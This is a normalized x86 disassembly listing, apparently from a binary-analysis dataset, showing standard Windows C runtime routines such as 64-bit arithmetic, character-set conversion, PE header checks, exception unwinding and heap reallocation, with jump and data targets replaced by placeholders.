and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1000f3f0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_1000f485
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_100095af
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1000a3c4
push 0x16
pop esi
mov [ eax ] esi
call sub_1000acab
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x2a
call sub_1000a3c4
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_1000a3c4
push 0x22
pop esi
mov [ eax ] esi
call sub_1000acab
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_1000a740
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_1000a740
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1000f5f7
push 0x10
push r--data
call sub_1000bc40
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_1000cc92
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000f68a
mov eax [ ebp - 0x1c ]
call sub_1000bc85
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_100096c3
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_10009181
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_1000f6a0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_1000f6e0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000f730
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1000bca0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_1000f6a0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_1000f6e0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000f7f0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000f810
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10008bf6
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_1000f855
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1000f855
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_1000f810
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000f905
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000f924
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1000f8fc
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1000f905
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1000f927
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_100106e8
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_1000f970
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1000f99b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000a3d7
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1000fa21
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1000a3d7
and [ eax ] 0x0
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000a3d7
and [ eax ] 0x0
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000acab
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_1000fa8a
push 0xc
push r--data
call sub_1000bc40
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_1000cc92
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_1000bc85
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000fb20
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_1000fb29
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1000fb50
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008bf6
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_10009636
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_10009388
pop ecx
cmp eax ebx
je r-xdata
call sub_1000dcf0
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_10009636
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_10009388
pop ecx
cmp eax ebx
je r-xdata
call sub_1000dcf0
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_1000fd37
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100095af
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1000fb50
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000fd7d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008bf6
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_1000a740
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10009636
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_10009388
pop ecx
cmp eax ebx
je r-xdata
call sub_1000dcf0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_1000fe64
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100095af
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1000fd7d
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000fea4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_10009181
push [ esi + 0x8 ]
call sub_10009181
push [ esi + 0xc ]
call sub_10009181
push [ esi + 0x10 ]
call sub_10009181
push [ esi + 0x14 ]
call sub_10009181
push [ esi + 0x18 ]
call sub_10009181
push [ esi ]
call sub_10009181
push [ esi + 0x20 ]
call sub_10009181
push [ esi + 0x24 ]
call sub_10009181
push [ esi + 0x28 ]
call sub_10009181
push [ esi + 0x2c ]
call sub_10009181
push [ esi + 0x30 ]
call sub_10009181
push [ esi + 0x34 ]
call sub_10009181
push [ esi + 0x1c ]
call sub_10009181
push [ esi + 0x38 ]
call sub_10009181
push [ esi + 0x3c ]
call sub_10009181
add esp 0x40
push [ esi + 0x40 ]
call sub_10009181
push [ esi + 0x44 ]
call sub_10009181
push [ esi + 0x48 ]
call sub_10009181
push [ esi + 0x4c ]
call sub_10009181
push [ esi + 0x50 ]
call sub_10009181
push [ esi + 0x54 ]
call sub_10009181
push [ esi + 0x58 ]
call sub_10009181
push [ esi + 0x5c ]
call sub_10009181
push [ esi + 0x60 ]
call sub_10009181
push [ esi + 0x64 ]
call sub_10009181
push [ esi + 0x68 ]
call sub_10009181
push [ esi + 0x6c ]
call sub_10009181
push [ esi + 0x70 ]
call sub_10009181
push [ esi + 0x74 ]
call sub_10009181
push [ esi + 0x78 ]
call sub_10009181
push [ esi + 0x7c ]
call sub_10009181
add esp 0x40
push [ esi + 0x80 ]
call sub_10009181
push [ esi + 0x84 ]
call sub_10009181
push [ esi + 0x88 ]
call sub_10009181
push [ esi + 0x8c ]
call sub_10009181
push [ esi + 0x90 ]
call sub_10009181
push [ esi + 0x94 ]
call sub_10009181
push [ esi + 0x98 ]
call sub_10009181
push [ esi + 0x9c ]
call sub_10009181
push [ esi + 0xa0 ]
call sub_10009181
push [ esi + 0xa4 ]
call sub_10009181
push [ esi + 0xa8 ]
call sub_10009181
push [ esi + 0xbc ]
call sub_10009181
push [ esi + 0xc0 ]
call sub_10009181
push [ esi + 0xc4 ]
call sub_10009181
push [ esi + 0xc8 ]
call sub_10009181
push [ esi + 0xcc ]
call sub_10009181
add esp 0x40
push [ esi + 0xd0 ]
call sub_10009181
push [ esi + 0xb8 ]
call sub_10009181
push [ esi + 0xd8 ]
call sub_10009181
push [ esi + 0xdc ]
call sub_10009181
push [ esi + 0xe0 ]
call sub_10009181
push [ esi + 0xe4 ]
call sub_10009181
push [ esi + 0xe8 ]
call sub_10009181
push [ esi + 0xec ]
call sub_10009181
push [ esi + 0xd4 ]
call sub_10009181
push [ esi + 0xf0 ]
call sub_10009181
push [ esi + 0xf4 ]
call sub_10009181
push [ esi + 0xf8 ]
call sub_10009181
push [ esi + 0xfc ]
call sub_10009181
push [ esi + 0x100 ]
call sub_10009181
push [ esi + 0x104 ]
call sub_10009181
push [ esi + 0x108 ]
call sub_10009181
add esp 0x40
push [ esi + 0x10c ]
call sub_10009181
push [ esi + 0x110 ]
call sub_10009181
push [ esi + 0x114 ]
call sub_10009181
push [ esi + 0x118 ]
call sub_10009181
push [ esi + 0x11c ]
call sub_10009181
push [ esi + 0x120 ]
call sub_10009181
push [ esi + 0x124 ]
call sub_10009181
push [ esi + 0x128 ]
call sub_10009181
push [ esi + 0x12c ]
call sub_10009181
push [ esi + 0x130 ]
call sub_10009181
push [ esi + 0x134 ]
call sub_10009181
push [ esi + 0x138 ]
call sub_10009181
push [ esi + 0x13c ]
call sub_10009181
push [ esi + 0x140 ]
call sub_10009181
push [ esi + 0x144 ]
call sub_10009181
push [ esi + 0x148 ]
call sub_10009181
add esp 0x40
push [ esi + 0x14c ]
call sub_10009181
push [ esi + 0x150 ]
call sub_10009181
push [ esi + 0x154 ]
call sub_10009181
push [ esi + 0x158 ]
call sub_10009181
push [ esi + 0x15c ]
call sub_10009181
push [ esi + 0x160 ]
call sub_10009181
add esp 0x18
sub_1001021b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
push esi
call sub_10009181
pop ecx
sub_10010284
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10009181
pop ecx
push esi
call sub_10009181
pop ecx
sub_10010382
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_10009388
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10009181
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_1000a247
pop ecx
call sub_1000a3c4
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_1000a3c4
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000a382
pop ecx
mov [ esi ] eax
push esi
call sub_1000a247
pop ecx
test eax eax
je r-xdata
call sub_1000a3c4
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000a382
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_10010430
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_10010470
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_100104c0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_10010500
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100095af
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_1001056b
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
